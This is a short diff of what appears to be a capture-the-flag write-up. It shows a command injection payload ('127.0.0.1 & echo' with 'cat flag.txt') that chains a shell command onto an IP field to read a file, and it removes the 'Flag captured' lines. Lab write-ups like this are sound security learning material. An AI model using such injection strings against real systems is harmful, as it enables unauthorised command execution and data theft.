@@ -59,6 +59,3 @@ Listing files
 <pre>127.0.0.1 & echo "$(cat flag.txt)"</pre>
 
 <img width="1228" height="394" alt="image" src="https://github.com/user-attachments/assets/e38815c5-3418-458b-9dd6-315b935b486a" />
-
-Flag captured
-Flag: PCTF{FLAG:O}
